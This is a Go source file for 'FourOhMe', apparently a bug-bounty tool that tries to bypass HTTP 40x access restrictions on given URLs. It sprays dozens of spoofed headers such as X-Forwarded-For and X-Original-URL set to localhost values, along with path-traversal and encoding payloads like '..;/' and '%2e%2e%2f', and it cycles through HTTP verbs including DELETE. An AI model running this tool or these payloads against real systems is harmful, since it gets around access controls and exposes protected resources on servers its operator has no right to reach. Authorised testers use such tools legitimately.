/*
FourOhMe is a tool for finding a bypass for URL's that respond with a 40* HTTP code.
It makes requests to a given URL with different headers and prints the responses.

Three input sources are supported out of the box. Either via STDIN, a file containing URLs or a single URL.

*** It's you ^ 2

Usage:

	fourohme [flags] [path ...]

The flags are:

	-silent
	    Do not print shizzle. Only what matters.
		Ideal in your command chain.
	-file
		File containing a list of urls
	-url
	    Single URL in https://foo.bar format

When gofmt reads from standard input, it accepts either a single URL
or a list of URLs. It's meant to be used in your command chain.
For example: cat domains.txt | httpx -silent -mc 401,402,403,404,405 | fourohme -silent
*/
package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
)

type Header struct {
	Key   string
	Value string
}

type Request struct {
	Verb    string
	Url     string
	Headers []Header
}

func main() {
	urlPtr, filePtr, silentPtr, threadsPtr := parseCommandLineFlags()

	if !*silentPtr {
		showBanner()
	}

	headerKeysList := []string{
		"Base-Url",
		"CF-Conne",
		"Client-IP",
		"Content-Length",
		"Destination",
		"From",
		"Http-Url",
		"Profile",
		"Proxy-Host",
		"Proxy-Url",
		"Proxy",
		"Real-Ip",
		"Redirect",
		"Referer",
		"Referrer",
		"Request-Uri",
		"True-Client-IP",
		"Uri",
		"Url",
		"X-Arbitrary",
		"X-Client-IP",
		"X-Custom-IP-Authorization",
		"X-Forward-For",
		"X-Forwarded-By",
		"X-Forwarded-For-Original",
		"X-Forwarded-For",
		"X-Forwarded-Host",
		"X-Forwarded-Proto",
		"X-Forwarded-Server",
		"X-Forwarded",
		"X-Forwarder-For",
		"X-Hos",
		"X-Host",
		"X-Http-Destinationurl",
		"X-HTTP-DestinationURL",
		"X-Http-Host-Override",
		"X-OReferrer",
		"X-Original-Remote-Addr",
		"X-Original-URL",
		"X-Originally-Forwarded-For",
		"X-Originating-IP",
		"X-Proxy-Url",
		"X-ProxyUser-Ip",
		"X-Real-Ip",
		"X-Remote-Addr",
		"X-Remote-IP",
		"X-Rewrite-URL",
		"X-rewrite-url",
		"X-WAP-Profile",
	}

	headerValuesList := []string{
		"127.0.0.1",
		"127.0.0.1:80",
		"127.0.0.1:443",
		"127.0.0.1:8080",
		"localhost",
		"localhost:80",
		"localhost:443",
		"localhost:8080",
		"www.google.com",
		"/",
		"142.250.186.46",
		"0",
	}

	var composedHeadersList []Header
	for _, key := range headerKeysList {
		for _, value := range headerValuesList {
			header := Header{Key: key, Value: value}
			composedHeadersList = append(composedHeadersList, header)
		}
	}

	httpVerbsList := []string{"GET", "POST", "HEAD", "DELETE", "PUT", "PATCH", "OPTIONS", "TRACE"}

	urlPayloadsList := []string{
		"/", "/*", "/%2f/", "/./", "./.", "/*/", "?", "??", "&",
		"#", "%", "%20", "%09", "/..;/", "../", "..%2f", "..;/",
		".././", "..%00/", "..%0d", "..%5c", "..%ff/", "%2e%2e%2f",
		".%2e/", "%3f", "%26", "%23", ".json",
	}

	// Let's Rock
	urls := readUrlsFromInput(urlPtr, filePtr)

	for _, pUrl := range urls {
		parsedURL, err := url.Parse(pUrl)
		if err != nil {
			panic(err)
		}

		// Try each header in composedHeadersList
		var wg sync.WaitGroup
		ch := make(chan Request, *threadsPtr)
		for _, header := range composedHeadersList {
			wg.Add(1)

			var headerList []Header
			headerList = append(headerList, header)

			request := Request{Verb: "GET", Url: pUrl, Headers: headerList}

			ch <- request

			go talkHttpBaby(ch, &wg)
		}

		// Try each header with %URL% variable
		for _, headerKey := range headerKeysList {
			wg.Add(1)

			var headerList []Header
			header := Header{Key: headerKey, Value: pUrl}
			headerList = append(headerList, header)

			request := Request{Verb: "GET", Url: pUrl, Headers: headerList}

			ch <- request

			go talkHttpBaby(ch, &wg)
		}

		sUrl, sPath := getHostAndPath(parsedURL)

		// Try each header with %PATH% variable
		for _, headerKey := range headerKeysList {
			wg.Add(1)

			var headerList []Header
			header := Header{Key: headerKey, Value: sPath}
			headerList = append(headerList, header)

			request := Request{Verb: "GET", Url: pUrl, Headers: headerList}

			ch <- request

			go talkHttpBaby(ch, &wg)
		}

		// Try each URL payload in urlPayloadsList
		var headerList []Header
		for _, payload := range urlPayloadsList {
			wg.Add(1)

			loadedUrl := fmt.Sprintf("%s%s%s", sUrl, sPath, payload)

			request := Request{Verb: "GET", Url: loadedUrl, Headers: headerList}

			ch <- request

			go talkHttpBaby(ch, &wg)
		}

		// Try with different HTTP Verbs
		for _, verb := range httpVerbsList {
			wg.Add(1)

			request := Request{Verb: verb, Url: pUrl, Headers: headerList}

			ch <- request

			go talkHttpBaby(ch, &wg)
		}

		close(ch)
		wg.Wait()

		fmt.Println("")
	}
}

func talkHttpBaby(ch chan Request, wg *sync.WaitGroup) {
	defer wg.Done() // Schedule the wg.Done() function call to be executed when the function returns

	request := <-ch

	statusCode := executeHttpRequest(request)

	printOutput(statusCode, request.Verb, request.Url, request.Headers)
}

func executeHttpRequest(request Request) int {
	verb := request.Verb
	url := request.Url
	headers := request.Headers

	req := createRequest(verb, url)

	if req == nil {
		return -1
	}

	for _, header := range headers {
		req.Header.Add(header.Key, header.Value)
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Println(err)
		resp.Body.Close()
		return -1
	}

	resp.Body.Close()
	return resp.StatusCode
}

func parseCommandLineFlags() (*string, *string, *bool, *int) {
	urlPtr := flag.String("url", "", "URL to make requests to")
	filePtr := flag.String("file", "", "Path to a file containing URLs")
	silentPtr := flag.Bool("silent", false, "Don't print shizzle. Only what matters.")
	threadsPtr := flag.Int("threads", 4, "The amount of threads to be used to execute the HTTP requests. Be gentle or get blocked.")
	flag.Parse()

	return urlPtr, filePtr, silentPtr, threadsPtr
}

func readUrlsFromInput(urlPtr, filePtr *string) []string {
	var urls []string

	urls = readUrlsFromStdin()

	if urls != nil {
		return urls
	}

	if *filePtr != "" {
		urls = readUrlsFromFile(*filePtr)
	} else if *urlPtr != "" {
		urls = strings.Split(*urlPtr, ",")
	}

	return urls
}

func readUrlsFromStdin() []string {
	stat, _ := os.Stdin.Stat()
	if (stat.Mode() & os.ModeCharDevice) == 0 {
		// Read from stdin
		urls := make([]string, 0)
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			urls = append(urls, scanner.Text())
		}

		return urls
	}

	return nil
}

func readUrlsFromFile(filepath string) []string {
	file, err := os.Open(filepath)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	defer file.Close()

	var urls []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		urls = append(urls, scanner.Text())
	}

	return urls
}

func getHostAndPath(parsedURL *url.URL) (string, string) {
	sUrl := parsedURL.Scheme + "://" + parsedURL.Host
	sPath := parsedURL.Path
	if sPath == "" {
		sPath = "/"
	}

	return sUrl, sPath
}

func createRequest(verb string, pUrl string) *http.Request {
	req, err := http.NewRequest(verb, pUrl, nil)

	if err != nil {
		fmt.Println(err)
		return nil
	}

	return req
}

func printOutput(statusCode int, verb string, url string, headers []Header) {
	// Print in green if it's 200
	if statusCode == 200 {
		fmt.Printf("\033[32m%d => HTTP %s %s %v\033[0m\n", statusCode, verb, url, headers)
	} else {
		fmt.Printf("\033[31m%d => HTTP %s %s %v\033[0m\n", statusCode, verb, url, headers)
	}
}

func showBanner() {
	const banner = `


███████╗░█████╗░██╗░░░██╗██████╗░░░░░░░░█████╗░██╗░░██╗░░░░░░███╗░░░███╗███████╗
██╔════╝██╔══██╗██║░░░██║██╔══██╗░░░░░░██╔══██╗██║░░██║░░░░░░████╗░████║██╔════╝
█████╗░░██║░░██║██║░░░██║██████╔╝█████╗██║░░██║███████║█████╗██╔████╔██║█████╗░░
██╔══╝░░██║░░██║██║░░░██║██╔══██╗╚════╝██║░░██║██╔══██║╚════╝██║╚██╔╝██║██╔══╝░░
██║░░░░░╚█████╔╝╚██████╔╝██║░░██║░░░░░░╚█████╔╝██║░░██║░░░░░░██║░╚═╝░██║███████╗
╚═╝░░░░░░╚════╝░░╚═════╝░╚═╝░░╚═╝░░░░░░░╚════╝░╚═╝░░╚═╝░░░░░░╚═╝░░░░░╚═╝╚══════╝

	by @topscoder

	`

	fmt.Println(banner)
}
